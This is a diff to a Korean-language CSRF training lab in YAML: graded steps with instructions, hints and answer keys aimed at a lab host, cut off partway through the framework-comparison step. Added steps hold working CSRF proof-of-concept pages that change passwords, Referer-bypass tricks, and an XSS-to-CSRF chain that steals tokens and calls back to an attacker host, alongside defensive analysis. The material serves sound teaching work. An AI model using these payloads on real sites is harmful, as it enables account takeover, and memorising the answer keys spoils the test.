@@ -13,8 +13,64 @@ objectives:
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: 대상 애플리케이션(http://{{WEB_IP}})의 폼에서 CSRF 토큰 존재 여부를 확인하시오.
-  hint: HTML 소스에서 hidden input을 찾으세요.
+  instruction: |-
+    대상 애플리케이션(http://{{WEB_IP}})의 폼에서 CSRF 토큰 존재 여부를 확인하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 도구 A — curl + grep (HTML 소스 분석)
+    ```bash
+    # 모든 form 의 hidden input 추출
+    curl -s http://10.20.30.80 | grep -ioE '<input[^>]*type="hidden"[^>]*>' | head -10
+
+    # CSRF 토큰 패턴 search
+    curl -s http://10.20.30.80 | grep -ioE '(csrf|_token|authenticity_token|xsrf)[^"]*"[^"]+"' | head -5
+    echo "CSRF 토큰 확인 완료"
+    ```
+
+    ▶ 2단계: 도구 B — Burp Suite + CSRF Scanner
+    1. Proxy → 모든 form/POST 요청 캡처
+    2. 우클릭 → **Engagement Tools → Generate CSRF PoC**
+    3. CSRF token 자동 식별 + PoC HTML 자동 생성
+
+    ▶ 3단계: 도구 C — OWASP ZAP CSRF check
+    ```bash
+    docker run -t owasp/zap2docker-stable zap-cli active-scan -p csrf http://10.20.30.80
+    ```
+
+    ▶ 4단계: 도구 D — nuclei CSRF 템플릿
+    ```bash
+    nuclei -u http://10.20.30.80 -t http/vulnerabilities/generic/csrf-detect.yaml -silent
+    ```
+
+    ▶ 5단계: 도구 E — 자동화 스크립트 (Python)
+    ```python
+    import requests, re
+    from bs4 import BeautifulSoup
+    r = requests.get('http://10.20.30.80')
+    soup = BeautifulSoup(r.text, 'html.parser')
+    forms = soup.find_all('form')
+    for form in forms:
+        token = form.find('input', {'name': re.compile('csrf|token', re.I)})
+        if not token:
+            print(f"[VULN] form action={form.get('action')} 에 CSRF 토큰 없음")
+        else:
+            print(f"[OK] {form.get('action')} → {token.get('name')}={token.get('value')[:8]}...")
+    ```
+
+    ▶ 6단계: CSRF 토큰 패턴 카탈로그
+    | Framework | 토큰 이름 |
+    |---|---|
+    | Django | `csrfmiddlewaretoken` |
+    | Rails | `authenticity_token` |
+    | Laravel | `_token` |
+    | Spring | `_csrf` |
+    | ASP.NET | `__RequestVerificationToken` |
+    | Angular | `XSRF-TOKEN` (cookie) + `X-XSRF-TOKEN` (header) |
+
+    ▶ 7단계: 답변
+    각 form 의 hidden input quote + CSRF 토큰 유무 + 프레임워크 식별.
+  hint: 'curl + grep hidden / Burp Generate CSRF PoC / OWASP ZAP / nuclei csrf-detect / Python BS auto.'
   category: csrf_detect
   points: 8
   answer: curl -s http://10.20.30.80 | grep -i 'csrf\|_token\|hidden' | head -10 &&
@@ -41,8 +97,59 @@ steps:
       - 방어 맥락 없음
   target_vm: attacker
 - order: 2
-  instruction: 'CSRF 공격용 HTML 페이지를 작성하시오: 패스워드 변경 요청 위조.'
-  hint: auto-submit 폼을 작성하세요.
+  instruction: |-
+    CSRF 공격용 HTML 페이지를 작성하시오: 패스워드 변경 요청 위조.
+
+    ■ 실습 방법
+
+    ▶ 1단계: PoC HTML 작성 (auto-submit form)
+    ```html
+    <!-- attacker.com/csrf.html -->
+    <html><body onload="document.forms[0].submit()">
+      <h1>로딩중...</h1>
+      <form action="http://10.20.30.80/profile" method="POST">
+        <input name="password" value="hacked123">
+        <input name="email" value="evil@attacker.com">
+      </form>
+    </body></html>
+    ```
+    피해자가 attacker.com 방문 → onload 즉시 폼 제출 → victim 의 쿠키 자동 첨부 → 패스워드 변경.
+
+    ▶ 2단계: 도구 A — Burp Suite "Generate CSRF PoC" (자동 생성)
+    1. Proxy 에서 패스워드 변경 요청 캡처
+    2. 우클릭 → **Engagement Tools → Generate CSRF PoC**
+    3. Burp 이 자동으로 HTML form 생성 (모든 파라미터 포함)
+    4. **Test in browser** 버튼 → 브라우저에서 실시간 검증
+
+    ▶ 3단계: 도구 B — csrfgenerator.com (웹 GUI)
+    https://csrfgenerator.com/ — Burp HTTP request paste → HTML PoC 자동 생성
+
+    ▶ 4단계: 도구 C — Python pycsrf (스크립트 자동화)
+    ```bash
+    pip install pycsrf-generator
+    pycsrf -u "http://10.20.30.80/profile" -m POST -d "password=hacked&email=evil"
+    # 또는 raw HTTP 입력
+    cat raw-request.txt | pycsrf-from-raw
+    ```
+
+    ▶ 5단계: PoC 변형 (auto-submit 외)
+    ```html
+    <!-- 변형 1: 클릭 유도 (사회 공학) -->
+    <form action="http://victim/profile" method="POST">
+      <input type="submit" value="🎁 무료 쿠폰 받기">
+      <input name="password" value="hacked" type="hidden">
+    </form>
+
+    <!-- 변형 2: iframe 숨김 -->
+    <iframe src="csrf-payload.html" style="display:none"></iframe>
+
+    <!-- 변형 3: image (GET 만 가능) -->
+    <img src="http://victim/api/transfer?amount=1000&to=evil" style="display:none">
+    ```
+
+    ▶ 6단계: 답변
+    PoC HTML 작성 + 동작 원리 (쿠키 자동 첨부) + 방어 (CSRF 토큰 / SameSite=Strict) 1 문장.
+  hint: 'auto-submit form / Burp Generate CSRF PoC / csrfgenerator.com / pycsrf / iframe·image 변형.'
   category: csrf_craft
   points: 10
   answer: echo '<html><body onload="document.forms[0].submit()"><form action="http://10.20.30.80/profile"
@@ -70,8 +177,45 @@ steps:
       - PoC 형식 없음
   target_vm: attacker
 - order: 3
-  instruction: 이미지 태그를 이용한 GET 기반 CSRF를 구성하시오.
-  hint: img src에 상태 변경 URL을 삽입하세요.
+  instruction: |-
+    이미지 태그를 이용한 GET 기반 CSRF를 구성하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 다양한 GET CSRF 벡터
+    ```html
+    <!-- 1. img 태그 (가장 단순, 응답 무시) -->
+    <img src="http://10.20.30.80/api/users/1/delete" style="display:none">
+
+    <!-- 2. iframe (응답 캡처 가능) -->
+    <iframe src="http://victim/api/transfer?to=evil&amount=1000" style="width:0;height:0"></iframe>
+
+    <!-- 3. link prefetch (브라우저 자동 prefetch) -->
+    <link rel="prefetch" href="http://victim/api/like?id=999">
+
+    <!-- 4. video / audio source -->
+    <video><source src="http://victim/api/follow?user=evil"></video>
+
+    <!-- 5. background image (CSS 안에) -->
+    <div style="background:url(http://victim/api/vote?option=A)"></div>
+
+    <!-- 6. import (CSS file as URL) -->
+    <link rel="stylesheet" href="http://victim/api/action?op=delete">
+    ```
+
+    ▶ 2단계: 도구 A — Burp Generate CSRF PoC (GET 자동)
+    GET 요청 캡처 → Generate CSRF PoC → img 태그 자동 생성.
+
+    ▶ 3단계: 도구 B — curl 으로 사전 검증
+    ```bash
+    # 쿠키 보유 상태에서 GET 만으로 상태 변경되는지 검증
+    curl -b cookies.txt "http://10.20.30.80/api/users/1/delete"
+    # 응답 200 + 상태 변경되면 GET CSRF 가능 (RFC 7231 위반)
+    ```
+
+    ▶ 4단계: 답변
+    PoC HTML quote + GET 으로 상태 변경 가능 = RFC 7231 위반 = 자동 위험 1 문장.
+  hint: 'img/iframe/link prefetch/video/CSS bg / Burp Generate CSRF PoC / curl 사전 검증.'
   category: csrf_craft
   points: 10
   answer: echo '<img src="http://10.20.30.80/api/users/1/delete" style="display:none">'
@@ -98,8 +242,60 @@ steps:
       - GET 위반 맥락 없음
   target_vm: attacker
 - order: 4
-  instruction: 'AJAX 기반 CSRF를 작성하시오: fetch API 활용.'
-  hint: 'fetch로 credentials: include 옵션을 사용하세요.'
+  instruction: |-
+    AJAX 기반 CSRF를 작성하시오: fetch API 활용.
+
+    ■ 실습 방법
+
+    ▶ 1단계: fetch API CSRF (현대 변형)
+    ```html
+    <script>
+    // credentials:include = 쿠키 자동 첨부
+    fetch('http://10.20.30.80/profile', {
+      method: 'POST',
+      credentials: 'include',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({email: 'evil@attacker.com'})
+    }).then(r => console.log(r.status));
+    </script>
+    ```
+    **단, CORS 제약**: 응답을 *읽으려면* `Access-Control-Allow-Origin` 필요. 그러나 *요청 자체*는 차단되지 않음 → 쓰기 작업 (POST/DELETE) 은 그대로 위험.
+
+    ▶ 2단계: XMLHttpRequest 변형 (legacy 호환)
+    ```javascript
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', 'http://victim/api/transfer', true);
+    xhr.withCredentials = true;
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr.send('to=evil&amount=1000');
+    ```
+
+    ▶ 3단계: 도구 A — Burp Suite + 동적 PoC
+    1. fetch 요청 캡처 → Burp Repeater 로 검증
+    2. **Generate CSRF PoC** → preflight 가 발생하지 않는 simple request 인지 자동 판단
+
+    ▶ 4단계: CORS Simple Request 조건 (preflight 없이 통과)
+    | 조건 | 값 |
+    |---|---|
+    | Method | GET / HEAD / POST |
+    | Headers | Accept / Accept-Language / Content-Language / Content-Type |
+    | Content-Type | text/plain / multipart/form-data / application/x-www-form-urlencoded **만** |
+
+    `application/json` 은 preflight 발생 → CSRF 차단. 그러나 일부 API 가 `text/plain` 도 받으면 우회 가능.
+
+    ▶ 5단계: 우회 — Content-Type 변경
+    ```javascript
+    fetch('http://victim/api/json-endpoint', {
+      method: 'POST',
+      credentials: 'include',
+      headers: {'Content-Type': 'text/plain'},  // simple request → preflight 없음
+      body: '{"email":"evil"}'  // 서버가 text/plain 도 JSON parse 한다면 통과
+    });
+    ```
+
+    ▶ 6단계: 답변
+    fetch PoC + simple request 조건 + 방어 (CORS Allow-Origin 명시 / 토큰 검증) 1 문장.
+  hint: 'fetch credentials:include / XHR legacy / CORS simple request 조건 / Content-Type 우회.'
   category: csrf_craft
   points: 10
   answer: echo 'fetch(URL,{method:"POST",credentials:"include",body:JSON.stringify({email:"evil@test.com"})})'
@@ -126,8 +322,53 @@ steps:
       - 쿠키 첨부 맥락 없음
   target_vm: attacker
 - order: 5
-  instruction: SameSite 쿠키 속성의 CSRF 방어 효과를 분석하시오.
-  hint: Set-Cookie 헤더에서 SameSite를 확인하세요.
+  instruction: |-
+    SameSite 쿠키 속성의 CSRF 방어 효과를 분석하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 도구 A — curl + grep (SameSite 확인)
+    ```bash
+    curl -sI http://10.20.30.80 | grep -i 'set-cookie'
+    # 출력 예: Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax
+    echo "SameSite 분석 완료"
+    ```
+
+    ▶ 2단계: SameSite 3 모드 비교
+    | 모드 | 동작 | CSRF 방어 효과 |
+    |---|---|---|
+    | **Strict** | 모든 cross-site 요청에 쿠키 미전송 | ✅ 완전 방어 (단, UX 저하) |
+    | **Lax** (Chrome 기본) | top-level GET 만 허용 (link click) | ⚠️ POST/iframe 차단, GET CSRF 일부 가능 |
+    | **None** | 모든 cross-site 허용 | ❌ Secure 필수, CSRF 무방어 |
+
+    ▶ 3단계: 도구 B — Chrome DevTools (시각 검증)
+    1. F12 → **Application** 탭 → **Cookies**
+    2. 각 쿠키의 **SameSite** 컬럼 확인
+    3. 우클릭 → **Show requests with this cookie** 으로 영향 추적
+
+    ▶ 4단계: 도구 C — 실제 cross-site 시뮬레이션 (Python http.server)
+    ```bash
+    # attacker 의 evil.html (다른 origin)
+    cat > /tmp/evil.html <<'EOF'
+    <html><body>
+      <img src="http://10.20.30.80/api/like?id=1">
+      <iframe src="http://10.20.30.80/api/transfer?to=evil"></iframe>
+    </body></html>
+    EOF
+    python3 -m http.server 8000 --directory /tmp &
+    # 다른 브라우저로 http://attacker:8000/evil.html 방문 후
+    # victim 서버 로그 확인 (쿠키 첨부 여부)
+    ```
+
+    ▶ 5단계: 도구 D — Burp Suite SameSite 검사
+    1. Proxy 로 요청 캡처
+    2. 우클릭 → **Send to Repeater**
+    3. Cookie 헤더 변경 후 응답 비교
+    4. SameSite=Strict 시 cross-origin 응답 거부 확인
+
+    ▶ 6단계: 답변
+    Set-Cookie 헤더 + SameSite 값 quote + 모드별 방어 정도 1 문장 + 권장값 (`SameSite=Strict; Secure; HttpOnly`).
+  hint: 'curl + grep / SameSite 3 모드 표 / DevTools Application / Python http.server cross-site 시뮬.'
   category: csrf_defense
   points: 10
   answer: curl -sI http://10.20.30.80 | grep -i 'set-cookie' && echo 'SameSite 분석
@@ -155,8 +396,64 @@ steps:
       - Strict/Lax/None 차이 없음
   target_vm: attacker
 - order: 6
-  instruction: CSRF 토큰 검증 로직의 약점을 분석하시오.
-  hint: 토큰 재사용, 빈 토큰 등을 테스트하세요.
+  instruction: |-
+    CSRF 토큰 검증 로직의 약점을 분석하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 도구 A — curl 로 토큰 약점 테스트 (8 패턴)
+    ```bash
+    # 1. 토큰 미검증 (제거 시도)
+    curl -X POST http://10.20.30.80/profile -d "email=evil"
+    # 200 OK → 토큰 검증 안 함 = 취약
+
+    # 2. 빈 토큰
+    curl -X POST -d "email=evil&_token=" http://10.20.30.80/profile
+
+    # 3. 다른 사용자 토큰 재사용
+    TOKEN_A="..."  # user A 의 토큰
+    # user B 의 쿠키 + user A 토큰
+    curl -X POST -b "session=USER_B_COOKIE" -d "_token=$TOKEN_A" http://victim/profile
+
+    # 4. 만료된 토큰 재사용
+    OLD_TOKEN="...어제 발급..."
+    curl -X POST -d "_token=$OLD_TOKEN" http://victim/profile
+
+    # 5. GET 으로 우회 (POST → GET 변경)
+    curl "http://victim/profile?email=evil&_token=anything"
+
+    # 6. PUT/PATCH/DELETE 로 우회
+    curl -X DELETE http://victim/api/users/1
+
+    # 7. Content-Type 변경 (multipart)
+    curl -X POST -F "email=evil" -F "_token=anything" http://victim/profile
+
+    # 8. 예측 가능 토큰 (Burp Sequencer 분석)
+    ```
+
+    ▶ 2단계: 도구 B — Burp Sequencer (토큰 무작위성 분석)
+    1. Burp Proxy → 토큰 발급 요청 캡처
+    2. **Send to Sequencer**
+    3. **Live Capture** → 200~1000 토큰 자동 수집
+    4. **Analyze Now** → entropy/character distribution 자동 분석
+    5. < 60 bits = 예측 가능 (취약)
+
+    ▶ 3단계: 도구 C — OWASP ZAP CSRF Tester
+    Active Scan → CSRF 룰 활성화. 자동 8 패턴 점검.
+
+    ▶ 4단계: CSRF 토큰 약점 카테고리
+    | 약점 | 영향 |
+    |---|---|
+    | 미검증 / 빈 허용 | 완전 우회 |
+    | 사용자 간 재사용 | 모든 사용자 공격 |
+    | 만료 무시 | 영구 토큰 |
+    | HTTP method 별 다름 | GET/PUT 우회 |
+    | Content-Type 별 다름 | multipart 우회 |
+    | 짧은 / 예측 가능 | brute force |
+
+    ▶ 5단계: 답변
+    1~2 약점 응답 quote + 영향 분석 + 방어 (모든 method 검증 / cryptographic random / 만료) 1 문장.
+  hint: 'curl 8 패턴 / Burp Sequencer entropy / OWASP ZAP CSRF Tester / 약점 카테고리 표.'
   category: csrf_bypass
   points: 12
   answer: echo '=== CSRF 토큰 약점 ===' && echo '1. 토큰 미검증' && echo '2. 빈 토큰 허용' && echo
@@ -183,8 +480,62 @@ steps:
       - 단순 설명
   target_vm: attacker
 - order: 7
-  instruction: Referer 헤더 기반 CSRF 방어를 우회하시오.
-  hint: Referer를 제거하는 기법을 사용하세요.
+  instruction: |-
+    Referer 헤더 기반 CSRF 방어를 우회하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: Referer 우회 5 방법
+    ```bash
+    # 1. 빈 Referer (Referrer-Policy)
+    curl -X POST -H "Referer: " http://victim/profile -d "email=evil"
+
+    # 2. meta 태그로 미전송 (HTML PoC)
+    cat > /tmp/csrf.html <<'EOF'
+    <meta name="referrer" content="no-referrer">
+    <body onload="document.forms[0].submit()">
+      <form action="http://victim/profile" method="POST">
+        <input name="email" value="evil">
+      </form>
+    </body>
+    EOF
+
+    # 3. data: URL (Referer 안 보냄)
+    # 또는 about:blank 에서 실행
+
+    # 4. HTTPS → HTTP downgrade (Referer 정책에 따라 누락)
+    # https://attacker → http://victim 이면 일부 브라우저가 Referer 제거
+
+    # 5. Referer 검증이 substring 이면 우회
+    curl -H "Referer: http://victim.com.attacker.com/" http://victim/profile -d "..."
+    # victim.com 부분 문자열 매칭만 하면 통과
+    ```
+
+    ▶ 2단계: 도구 A — Burp Repeater + Referer 변경
+    1. 요청 캡처 → Repeater 로 전달
+    2. Referer 헤더 빈 / 다른 도메인으로 변경
+    3. 응답 비교 (200 = 우회 성공)
+
+    ▶ 3단계: 도구 B — Browser Referrer-Policy
+    ```html
+    <meta name="referrer" content="no-referrer">
+    <!-- 또는 -->
+    <a href="..." rel="noreferrer">
+    <!-- HTTP 헤더 -->
+    Referrer-Policy: no-referrer
+    ```
+
+    ▶ 4단계: 도구 C — curl 으로 substring 검증 우회 시뮬
+    ```bash
+    # 서버가 if (referer.contains("victim.com")) ... 패턴이면
+    curl -H "Referer: http://attacker.com/?victim.com" http://victim/api -d "x=1"
+    # 또는 subdomain
+    curl -H "Referer: http://victim.com.attacker.com/" ...
+    ```
+
+    ▶ 5단계: 답변
+    우회 페이로드 (meta no-referrer 또는 substring) + 응답 200 quote + "Referer 만 의존 = 부족 → 토큰 + SameSite 권장" 1 문장.
+  hint: 'curl 빈 Referer / meta no-referrer / Referrer-Policy / substring 우회 / Burp Repeater.'
   category: csrf_bypass
   points: 10
   answer: echo '<meta name="referrer" content="no-referrer">' && echo 'Referer 우회
@@ -213,8 +564,58 @@ steps:
       - 우회 방법 없음
   target_vm: attacker
 - order: 8
-  instruction: JSON 기반 엔드포인트의 CSRF 가능성을 분석하시오.
-  hint: Content-Type 제한을 확인하세요.
+  instruction: |-
+    JSON 기반 엔드포인트의 CSRF 가능성을 분석하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 도구 A — curl 으로 Content-Type 검증
+    ```bash
+    # JSON API 의 Content-Type 우회 시도
+    URLS=(http://10.20.30.80/api/users http://10.20.30.80/api/transfer)
+    for url in "${URLS[@]}"; do
+      echo "=== $url ==="
+      # 1. application/json (preflight 발생)
+      curl -X POST -H 'Content-Type: application/json' -d '{"email":"evil"}' "$url" -i | head -1
+      # 2. text/plain (simple request, preflight 없음)
+      curl -X POST -H 'Content-Type: text/plain' -d '{"email":"evil"}' "$url" -i | head -1
+      # 3. multipart/form-data
+      curl -X POST -F 'email=evil' "$url" -i | head -1
+      # 4. application/x-www-form-urlencoded
+      curl -X POST -d "email=evil" "$url" -i | head -1
+    done
+    echo "JSON CSRF 분석 완료"
+    ```
+    서버가 text/plain 본문도 JSON 으로 parse 하면 → CSRF 가능 (preflight 우회).
+
+    ▶ 2단계: HTML form 으로 JSON CSRF (text/plain 트릭)
+    ```html
+    <form action="http://victim/api/transfer" method="POST" enctype="text/plain">
+      <input name='{"to":"evil","amount":1000,"_padding":"' value='"}'>
+    </form>
+    <!-- 결과 본문: {"to":"evil","amount":1000,"_padding":"="} -->
+    <!-- 일부 JSON parser 가 받음 -->
+    ```
+
+    ▶ 3단계: 도구 B — Burp Active Scan + JSON CSRF
+    Active Scan 의 "Cross-site request forgery" 룰이 자동 시도.
+
+    ▶ 4단계: 도구 C — nuclei JSON CSRF 템플릿
+    ```bash
+    nuclei -u http://10.20.30.80 -t http/misconfiguration/ -tags csrf,cors -silent
+    ```
+
+    ▶ 5단계: 방어 검증
+    ```bash
+    # 정상 서버: application/json 만 받고 text/plain 거부
+    curl -X POST -H 'Content-Type: text/plain' -d '{"x":1}' http://target/api/json
+    # 응답: 415 Unsupported Media Type (방어 OK)
+    # 또는: 400 Bad Request — Content-Type required
+    ```
+
+    ▶ 6단계: 답변
+    각 Content-Type 응답 코드 quote + 방어 (Content-Type 강제 검증 / preflight 강제 / 토큰) 1 문장.
+  hint: 'curl Content-Type 4 종 / form enctype=text/plain 트릭 / Burp Active Scan / nuclei csrf,cors.'
   category: csrf_advanced
   points: 10
   answer: "curl -s -X POST http://10.20.30.80/api/test \\\n  -H 'Content-Type: text/plain'\
@@ -241,8 +642,59 @@ steps:
       - 단순 POST
   target_vm: attacker
 - order: 9
-  instruction: CORS 설정과 CSRF의 관계를 분석하시오.
-  hint: Access-Control 헤더를 확인하세요.
+  instruction: |-
+    CORS 설정과 CSRF의 관계를 분석하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 도구 A — curl + Origin 변조
+    ```bash
+    # 1. 기본 응답 (Origin 없음)
+    curl -sI http://10.20.30.80/api/users | grep -i 'access-control'
+
+    # 2. evil.com Origin 으로 응답 (위험 검증)
+    curl -sI -H 'Origin: http://evil.com' http://10.20.30.80/api/users | grep -i 'access-control'
+
+    # 3. null Origin (file:// 또는 sandboxed iframe)
+    curl -sI -H 'Origin: null' http://10.20.30.80/api/users | grep -i 'access-control'
+
+    # 4. subdomain wildcard 시도
+    curl -sI -H 'Origin: http://attacker.victim.com' http://10.20.30.80/api/users
+    ```
+
+    ▶ 2단계: 도구 B — CORScanner (자동 CORS 취약점 점검)
+    ```bash
+    pip install corscanner
+    python3 -m corscanner -u http://10.20.30.80
+    # 출력 예:
+    # [INFO] Reflected origin: http://evil.com (위험)
+    # [INFO] Wildcard with credentials (불가능, 단 Allow-Credentials:true 와 ACAO:* 결합 시도)
+    ```
+
+    ▶ 3단계: 도구 C — corsy
+    ```bash
+    git clone https://github.com/s0md3v/Corsy ~/Corsy
+    python3 ~/Corsy/corsy.py -u http://10.20.30.80
+    # 13 CORS misconfiguration 패턴 자동 점검
+    ```
+
+    ▶ 4단계: CORS 위험 패턴
+    | 패턴 | 위험 | 예 |
+    |---|---|---|
+    | `ACAO: *` + `ACAC: false` | 낮음 (쿠키 X) | 정적 API |
+    | `ACAO: *` + `ACAC: true` | 브라우저가 차단 (불가능) | — |
+    | **`ACAO: $reflect` + `ACAC: true`** | ❌ 매우 위험 | `if (origin) { header('Access-Control-Allow-Origin: '.$origin) }` |
+    | `ACAO: null` + `ACAC: true` | ❌ 위험 | sandboxed iframe 공격 가능 |
+    | substring 매칭 | ❌ 위험 | `victim.com.attacker.com` 우회 |
+
+    ▶ 5단계: CSRF 와의 관계
+    - **Origin 반사 + Allow-Credentials true** = CORS 우회 + 쿠키 첨부 = **CSRF 보다 더 위험** (응답까지 읽기 가능)
+    - **CORS 정상** + JSON 엔드포인트 = preflight 강제 = CSRF 자동 차단
+    - 따라서 **JSON API + 엄격한 CORS** = CSRF 자체 방어
+
+    ▶ 6단계: 답변
+    Origin 변조 응답 quote + 위험 패턴 1개 + 권장 (`Vary: Origin` + 화이트리스트 + 토큰) 1 문장.
+  hint: 'curl -H Origin 변조 / CORScanner / Corsy 13 패턴 / ACAO+ACAC 결합 분석.'
   category: csrf_advanced
   points: 10
   answer: "curl -sI \\\n  -H 'Origin: http://evil.com' http://10.20.30.80 \\\n | grep\
@@ -269,8 +721,64 @@ steps:
       - 와일드카드 분석 누락
   target_vm: attacker
 - order: 10
-  instruction: CSRF와 XSS 체인 공격을 설계하시오.
-  hint: XSS로 CSRF 토큰을 탈취하는 시나리오를 구성하세요.
+  instruction: |-
+    CSRF와 XSS 체인 공격을 설계하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 체인 공격 시나리오 (XSS → 토큰 탈취 → CSRF)
+    ```javascript
+    // 1. XSS payload (피해자 페이지 안에서 실행)
+    <script>
+    // Step A: 페이지에서 CSRF 토큰 추출
+    const token = document.querySelector('input[name="_token"]').value
+              || document.cookie.match(/XSRF-TOKEN=([^;]+)/)?.[1]
+              || document.querySelector('meta[name="csrf-token"]')?.content;
+
+    // Step B: 추출 토큰으로 CSRF 요청 (같은 origin 이라 쿠키 자동)
+    fetch('/profile', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-CSRF-TOKEN': token
+      },
+      body: JSON.stringify({email: 'evil@attacker.com'})
+    }).then(r => fetch('http://attacker:9999/done?status='+r.status));
+    </script>
+    ```
+
+    ▶ 2단계: 도구 A — BeEF "Ajax Fingerprint" 모듈
+    BeEF (이전 lab). 사용:
+    1. Hooked Browser → **Commands → Network → Ajax Fingerprint**
+    2. 자동: 페이지의 모든 form/AJAX endpoint 분석
+    3. 토큰 자동 추출 + CSRF 요청 자동 chain
+
+    ▶ 3단계: 도구 B — XSStrike + Custom Payload (체인 자동)
+    ```bash
+    cd ~/XSStrike
+    cat > custom_payload.txt <<'EOF'
+    <script>fetch('/profile',{method:'POST',headers:{'X-CSRF-TOKEN':document.querySelector('meta[name="csrf-token"]').content},body:JSON.stringify({email:'evil'})});</script>
+    EOF
+    python3 xsstrike.py -u "http://10.20.30.80/#/search?q=test" --payloads custom_payload.txt
+    ```
+
+    ▶ 4단계: 도구 C — Burp Suite Macro (체인 자동화)
+    1. Macros → New → 1 단계: GET /profile (토큰 추출 정규식)
+    2. 2 단계: POST /profile/update (1 단계 토큰 사용)
+    3. **Session Handling Rules** 에 macro 적용
+    4. Repeater/Intruder 에서 자동 chain
+
+    ▶ 5단계: 의미 — 다층 방어의 중요성
+    ```
+    XSS 단독       → 정보 노출
+    CSRF 단독      → 토큰으로 방어 가능
+    XSS + CSRF 체인 → 토큰 무력화 → 완전 침해
+    ```
+    OWASP defense in depth 가 필요한 이유.
+
+    ▶ 6단계: 답변
+    체인 페이로드 quote + 토큰 탈취 → CSRF 요청 흐름 + 방어 (XSS 자체 차단이 CSRF 방어 전제) 1 문장.
+  hint: 'XSS payload + 토큰 추출 + fetch chain / BeEF Ajax Fingerprint / XSStrike custom payload / Burp Macro chain.'
   category: csrf_advanced
   points: 10
   answer: echo '=== XSS+CSRF 체인 ===' && echo '1. XSS로 CSRF 토큰 읽기' && echo '2. 탈취 토큰으로
@@ -297,8 +805,67 @@ steps:
       - 방어 무효 맥락 없음
   target_vm: attacker
 - order: 11
-  instruction: Double Submit Cookie 방어 기법을 분석하시오.
-  hint: 쿠키와 요청 파라미터의 토큰 비교를 설명하세요.
+  instruction: |-
+    Double Submit Cookie 방어 기법을 분석하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: Double Submit Cookie 패턴 (3 단계)
+    ```
+    1. 로그인 시 서버가 cryptographic random 토큰 생성
+       → Set-Cookie: XSRF-TOKEN=abc123; Path=/; Secure
+       (HttpOnly 미설정 — JS 가 읽을 수 있어야 함)
+
+    2. 클라이언트 (JS) 가 매 요청 시 쿠키 값을 읽고 헤더로 복사
+       → X-XSRF-TOKEN: abc123 (또는 hidden form field)
+
+    3. 서버가 쿠키 값과 헤더 값 비교 → 일치 시만 처리
+    ```
+
+    ▶ 2단계: 도구 A — curl 으로 Double Submit 검증
+    ```bash
+    # 쿠키 + 헤더 동시 전송 (정상)
+    curl -X POST -b "XSRF-TOKEN=abc123" -H "X-XSRF-TOKEN: abc123" \
+         http://10.20.30.80/api/profile -d '{"email":"new"}'
+    # 200 OK
+
+    # 쿠키만 (헤더 누락) — CSRF 시도
+    curl -X POST -b "XSRF-TOKEN=abc123" \
+         http://10.20.30.80/api/profile -d '{"email":"evil"}'
+    # 403 Forbidden (방어 동작)
+
+    # 다른 토큰 (시도)
+    curl -X POST -b "XSRF-TOKEN=abc123" -H "X-XSRF-TOKEN: xyz999" \
+         http://10.20.30.80/api/profile -d '{"email":"evil"}'
+    # 403 Forbidden
+    ```
+
+    ▶ 3단계: 왜 안전? (cross-origin attacker 입장)
+    ```
+    attacker.com 의 JS 에서 —
+      victim.com 의 XSRF-TOKEN 쿠키는 attacker.com 의 document.cookie 로 못 읽음 (Same-Origin Policy)
+      → X-XSRF-TOKEN 헤더 만들 수 없음
+      → 서버 검증에서 403
+    ```
+
+    ▶ 4단계: 약점 + 방어 강화
+    | 약점 | 강화 |
+    |---|---|
+    | 토큰을 cookie 로 보냄 → MITM 공격 시 노출 | HTTPS + HSTS |
+    | XSS 가 토큰 읽을 수 있음 | XSS 자체 차단 |
+    | subdomain takeover (a.victim.com 우회) | __Host- prefix 사용 |
+    | sub-domain 에서 SetCookie 가능 | __Host- + Domain 미설정 |
+
+    ▶ 5단계: Synchronizer Token Pattern (대안)
+    ```
+    Double Submit: 쿠키 ↔ 헤더 일치 (stateless, fast)
+    Synchronizer: 서버 세션에 저장 ↔ 폼 hidden field 일치 (stateful, secure)
+    ```
+    OWASP 권장: Synchronizer 가 더 안전 (서버 세션 저장).
+
+    ▶ 6단계: 답변
+    3 단계 동작 quote (Set-Cookie + X-XSRF-TOKEN 매칭) + curl 검증 응답 + Synchronizer vs Double Submit 비교 1 문장.
+  hint: '3 단계 (cookie+header+match) / curl 검증 / SOP 안전성 / __Host- prefix / Synchronizer 대안.'
   category: csrf_defense
   points: 10
   answer: echo '=== Double Submit Cookie ===' && echo '1. 서버가 랜덤 토큰을 쿠키로 설정' && echo
@@ -325,8 +892,58 @@ steps:
       - 한계 누락
   target_vm: attacker
 - order: 12
-  instruction: 프레임워크별 CSRF 방어 기능을 비교하시오.
-  hint: Django, Spring, Express 등의 CSRF 방어를 정리하세요.
+  instruction: |-
+    프레임워크별 CSRF 방어 기능을 비교하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 프레임워크 별 CSRF 방어 비교표
+    | Framework | 활성화 | 토큰 위치 | 검증 |
+    |---|---|---|---|
+    | **Django** | `MIDDLEWARE += ['django.middleware.csrf.CsrfViewMiddleware']` | `{% csrf_token %}` hidden input | `csrfmiddlewaretoken` POST |
+    | **Spring Security** | `http.csrf().csrfTokenRepository(...)` | meta tag + `<form>` hidden | `_csrf` 또는 `X-CSRF-TOKEN` 헤더 |
+    | **Rails** | `protect_from_forgery with: :exception` (기본 활성) | `<%= csrf_meta_tags %>` | `authenticity_token` |
+    | **Laravel** | `VerifyCsrfToken` middleware (기본 활성) | `@csrf` blade directive | `_token` |
+    | **Express + csurf** | `app.use(csurf())` | `req.csrfToken()` 으로 발급 | `_csrf` 또는 `X-CSRF-TOKEN` |
+    | **ASP.NET Core** | `services.AddAntiforgery()` | `@Html.AntiForgeryToken()` | `__RequestVerificationToken` |
